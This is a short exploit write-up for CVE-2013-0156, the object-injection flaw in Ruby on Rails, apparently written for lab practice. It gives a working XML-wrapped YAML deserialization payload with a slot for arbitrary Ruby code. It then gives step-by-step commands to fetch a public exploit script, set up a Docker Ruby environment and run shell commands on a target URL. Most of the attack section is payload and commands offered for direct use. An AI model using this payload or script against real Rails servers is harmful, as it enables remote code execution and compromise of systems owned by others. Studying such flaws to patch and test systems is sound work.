# CVE-2013-0156 / Rails Object Injection

This vulnerability is caused by an arbitrary deserialization that can be used to trigger SQL injection and even Code execution.

### Exploit theory

```xml
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? |
  foo
  (RUBY; @executed = true) unless @executed
  __END__
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format</exploit>
```

Where **RUBY** is some arbitrary Ruby code.

By default, Rails doesn't support pure yaml in a request body. But it  supports XML that can embeds YAML in it (this explains the first two  lines of the payload). Finally, the `@executed` is used to ensure that the code is only run once.

### Exploiting

download this file: [rails_rce.rb](https://gist.githubusercontent.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb)

then run docker for ruby environment: 

```bash
docker run -it ruby:2 /bin/bash
```

now install dependencies in this docker container:

```bash
gem install ronin-support
```

Now run command:

```bash
ruby rails_rce.rb URL '`uname`'
```

NOTE: **only use single inverted commas to run ruby code inside it and use backtics to run bash commands inside it** 